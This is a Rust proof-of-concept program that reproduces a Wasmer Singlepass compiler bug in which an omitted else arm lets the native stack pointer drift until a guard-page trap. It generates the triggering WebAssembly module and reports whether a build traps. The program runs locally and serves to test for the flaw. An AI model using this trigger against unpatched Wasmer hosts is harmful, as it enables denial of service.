// sp-drift-poc — independent reproduction of the Singlepass implicit-else native-stack drift
// described in GHSA-v2h8-j899-r676 and fixed by wasmerio/wasmer PR #7128.
//
// The module is the upstream regression shape (tests/compilers/issues.rs,
// `implicit_else_reclaims_inputs`): a non-recursive loop that executes a typed `if` with block
// parameters and an omitted `else` N times. On a vulnerable build the false arm skips the cleanup
// of spilled block parameters, so the native stack pointer drifts by 8 bytes per iteration until a
// subsequent access hits the guard page (trap / SIGSEGV). On a fixed build the same module returns
// normally.
//
// The run happens on a thread with a bounded stack (default 2 MiB) so that the cumulative drift is
// observable within the upstream iteration count regardless of the process stack limit.
//
// Read-only: no network, no chain access, no state change. This is a local compiler test.

use std::env;
use wasmer::sys::{EngineBuilder, Singlepass};
use wasmer::{imports, Instance, Module, Store};

fn build_wat(
    param_count: usize,
    prefix_count: usize,
    body: &str,
    explicit_else: bool,
    iters: u32,
) -> String {
    let types = " i64".repeat(param_count);
    let block_type = if param_count == 0 { "" } else { "(type $pass)" };
    let pushes = "local.get $value\n".repeat(prefix_count + param_count);
    let drops = "drop\n".repeat(prefix_count);
    let checks = "local.get $expected i64.ne if unreachable end\n".repeat(param_count);
    let replace = "drop\n".repeat(param_count) + &"i64.const 42\n".repeat(param_count);
    let body = match body {
        "empty" => "",
        "replace" => replace.as_str(),
        "branch" => "br 0",
        "unreachable" => "unreachable",
        other => other,
    };
    let else_text = if explicit_else { "else" } else { "" };
    let type_decl = if param_count == 0 {
        String::new()
    } else {
        format!("(type $pass (func (param {types}) (result {types})))")
    };
    format!(
        r#"(module
            {type_decl}
            (func $probe)
            (func (export "check")
                (param $value i64) (param $condition i32) (param $expected i64)
                (result i32) (local $remaining i32)
                i32.const {iters} local.set $remaining
                loop
                    {pushes}
                    local.get $condition
                    if {block_type} {body} {else_text} end
                    {checks}
                    {drops}
                    call $probe
                    local.get $remaining i32.const 1 i32.sub
                    local.tee $remaining br_if 0
                end
                i32.const 1))"#
    )
}

fn run(args: &[String]) -> i32 {
    let get = |name: &str, default: &str| -> String {
        args.iter()
            .position(|a| a == name)
            .and_then(|i| args.get(i + 1).cloned())
            .unwrap_or_else(|| default.to_string())
    };
    let param_count: usize = get("--params", "2").parse().unwrap();
    let prefix_count: usize = get("--prefix", "31").parse().unwrap();
    let iters: u32 = get("--iters", "400000").parse().unwrap();
    let condition: i32 = get("--cond", "0").parse().unwrap();
    let body = get("--body", "empty");
    let explicit_else = get("--explicit-else", "0") == "1";

    let wat = build_wat(param_count, prefix_count, &body, explicit_else, iters);
    let wasm = match wat::parse_str(&wat) {
        Ok(v) => v,
        Err(e) => {
            println!("RESULT=WAT_ERROR err={e}");
            return 2;
        }
    };

    let compiler = Singlepass::default();
    let engine = EngineBuilder::new(compiler).engine();
    let mut store = Store::new(engine);
    let module = match Module::new(&store, wasm) {
        Ok(m) => m,
        Err(e) => {
            println!("RESULT=COMPILE_ERROR err={e}");
            return 2;
        }
    };
    let instance = match Instance::new(&mut store, &module, &imports! {}) {
        Ok(i) => i,
        Err(e) => {
            println!("RESULT=INSTANTIATE_ERROR err={e}");
            return 2;
        }
    };
    let check = match instance
        .exports
        .get_typed_function::<(i64, i32, i64), i32>(&store, "check")
    {
        Ok(f) => f,
        Err(e) => {
            println!("RESULT=EXPORT_ERROR err={e}");
            return 2;
        }
    };

    let expected: i64 = 123;
    match check.call(&mut store, 123, condition, expected) {
        Ok(v) => {
            println!(
                "RESULT=OK ret={v} params={param_count} prefix={prefix_count} cond={condition} body={body} explicit_else={explicit_else} iters={iters}"
            );
            0
        }
        Err(e) => {
            println!(
                "RESULT=TRAP params={param_count} prefix={prefix_count} cond={condition} body={body} explicit_else={explicit_else} iters={iters} err={e}"
            );
            3
        }
    }
}

fn main() {
    let args: Vec<String> = env::args().collect();
    let stack: usize = args
        .iter()
        .position(|a| a == "--stack")
        .and_then(|i| args.get(i + 1).cloned())
        .unwrap_or_else(|| "2097152".to_string())
        .parse()
        .unwrap();

    let handle = std::thread::Builder::new()
        .stack_size(stack)
        .spawn(move || run(&args))
        .expect("spawn");
    let code = handle.join().unwrap_or(139);
    std::process::exit(code);
}
